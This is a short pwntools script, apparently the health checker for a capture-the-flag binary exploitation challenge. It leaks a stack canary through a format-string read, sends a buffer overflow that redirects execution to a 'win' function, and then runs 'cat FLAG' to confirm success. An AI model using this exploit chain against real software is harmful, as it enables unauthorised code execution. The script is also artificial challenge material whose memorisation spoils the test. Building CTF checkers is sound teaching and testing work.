from pwn import *
import sys
from time import sleep


def checker(host, port):
    try:
        pc = connect(host, port, timeout=3)
        # pc = process("./chall")
    except:
        return 2
    win = p64(0x401245)
    print(pc.recvuntil(": "))
    pc.sendline(b"%9$p")
    canary = int(pc.recvuntil(b"\n")[:-1], 16)
    log.info("Canary : " + hex(canary))
    pc.sendline(b"A" * 24 + p64(canary) + p64(0) + win)
    # gdb.attach(pc,'b *0x4012e8')
    pc.sendline(b"YES")
    sleep(1)
    pc.sendline("cat FLAG")
    ret = pc.recvall(timeout=1)
    print(ret)
    if b"FLAG{N0PE!}" in ret:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if checker(sys.argv[1], 9006) != 0:
        exit(1)
